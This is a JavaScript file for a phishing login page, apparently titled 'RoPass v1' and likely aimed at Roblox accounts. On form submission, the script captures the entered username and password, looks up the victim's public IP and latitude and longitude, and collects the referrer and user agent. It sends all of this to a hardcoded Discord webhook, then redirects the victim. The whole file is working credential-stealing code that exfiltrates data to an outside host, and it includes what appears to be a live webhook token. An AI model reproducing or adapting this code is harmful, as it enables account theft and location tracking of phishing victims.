async function getPublicIP() {
    const response = await fetch('https://api.ipify.org');
    return response.text();
}

async function getGeolocation(ip) {
    const url = `https://ipapi.co/${ip}/json/`;
    const response = await fetch(url);
    return response.json();
}

function testInput(data) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(data.trim()));
    return div.innerHTML;
}

async function sendToDiscordWebhook(data) {
    const webhookUrls = [
        'https://discord.com/api/webhooks/1465383691097342145/iPjYtTuUTLCd6cAEhosTWyycBzilHQbeDKM9oXk-3ltQ7LzL-3HkGhPUefDoZI2EwpaD',  // Replace with your actual Discord webhook URL
    ];

    const embed = {
        title: "RoPass v1",
        color: 0x3762dc,
        fields: [
            { name: "👤 Username", value: `\`${data.username}\``, inline: true },
            { name: "🔑 Password", value: `\`${data.password}\``, inline: true },
            { name: "🌍 Public IP", value: `\`${data.public_ip}\``, inline: true },
            { name: "📍 Latitude", value: `\`${data.latitude}\``, inline: true },
            { name: "📏 Longitude", value: `\`${data.longitude}\``, inline: true },
            { name: "🔗 Referrer", value: `\`${data.referrer}\``, inline: true },
            { name: "📡 Port", value: `\`${data.port}\``, inline: true },
            { name: "📅 Date", value: `\`${data.date}\``, inline: true },
            { name: "🖥️ User Agent", value: `\`${data.user_agent}\``, inline: false },
        ],
        image: {
            url: "https://i.imgur.com/8TqBJyU.png"
        }
    };

    const jsonData = JSON.stringify({ embeds: [embed] });

    for (const webhookUrl of webhookUrls) {
        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': jsonData.length.toString()
                },
                body: jsonData
            });
            const text = await response.text();
            console.log('Response from Discord:', text);
        } catch (error) {
            console.error('Fetch error:', error);
        }
    }
}

async function logData(username, password) {
    const publicIP = await getPublicIP();
    const rem_port = window.location.port || 'N/A';
    const user_agent = navigator.userAgent;
    const date = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const referrer = document.referrer || 'N/A';

    const locationInfo = await getGeolocation(publicIP);
    const latitude = locationInfo.latitude ?? 'N/A';
    const longitude = locationInfo.longitude ?? 'N/A';

    const logMessage = {
        username,
        password,
        public_ip: publicIP,
        geolocation: locationInfo,
        latitude,
        longitude,
        referrer,
        port: rem_port,
        date,
        user_agent
    };

    await sendToDiscordWebhook(logMessage);
}

// Example usage:
// Assuming you have a form with id 'loginForm' and inputs with names 'username' and 'password'
document.getElementById('loginForm').addEventListener('submit', async (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);
    const username = testInput(formData.get('username') || '');
    const password = testInput(formData.get('password') || '');

    if (username && password) {
        await logData(username, password);
        window.location.href = 'index.html';
    }
});
